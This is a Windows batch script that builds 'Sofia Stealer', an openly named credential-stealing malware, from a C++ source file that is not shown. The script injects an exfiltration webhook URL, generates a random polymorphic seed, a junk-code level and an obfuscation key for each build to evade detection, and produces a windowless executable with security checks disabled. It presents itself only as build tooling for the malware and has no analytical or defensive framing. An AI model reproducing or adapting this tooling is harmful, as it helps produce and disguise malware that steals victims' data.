@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo [*] Searching for Visual Studio...
set "VSPATH="
for %%E in (
    "%ProgramFiles%\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"
) do (
    if exist %%E (
        set "VSPATH=%%E"
        goto :found
    )
)

:found
if not defined VSPATH (
    echo [!] Visual Studio not found.
    exit /b 1
)
call %VSPATH% x64 >nul

echo [*] Building Sofia Stealer (Merged Mode)...

set "MAIN_SOURCE=SofiaStealer.cpp"
set /a POLY_SEED=%RANDOM% * %RANDOM%
set /a OBFS_KEY=%RANDOM% %% 254 + 1

:: Webhook override from Environment Variable
if not defined SOFIA_WEBHOOK_URL (
    set "WEBHOOK_DEF="
) else (
    set "WEBHOOK_DEF=/DSOFIA_WEBHOOK_URL=\"%SOFIA_WEBHOOK_URL%\""
)

cl.exe ^
  /EHsc /O2 /MT /GS- /sdl- /std:c++17 ^
  /D_CRT_SECURE_NO_WARNINGS ^
  /DPOLY_SEED=%POLY_SEED% ^
  /DJUNK_LEVEL=3 ^
  /DOBFS_KEY=0x%OBFS_KEY% ^
  %WEBHOOK_DEF% ^
  /FI"winsock2.h" ^
  %MAIN_SOURCE% ^
  /link ^
    /OUT:Sofia.exe ^
    /SUBSYSTEM:WINDOWS ^
    /INCREMENTAL:NO ^
    /PDB:NONE ^
    /DEFAULTLIB:libcmt.lib ^
    ws2_32.lib wlanapi.lib bcrypt.lib wininet.lib winhttp.lib crypt32.lib ^
    ncrypt.lib shell32.lib user32.lib gdi32.lib ole32.lib oleaut32.lib ^
    advapi32.lib shlwapi.lib iphlpapi.lib comctl32.lib

if %errorlevel% neq 0 (
    echo [X] Compilation FAILED!
    exit /b 1
) else (
    echo [V] Sofia.exe compiled successfully!
    del /q /f *.obj >nul 2>&1
)

exit /b 0
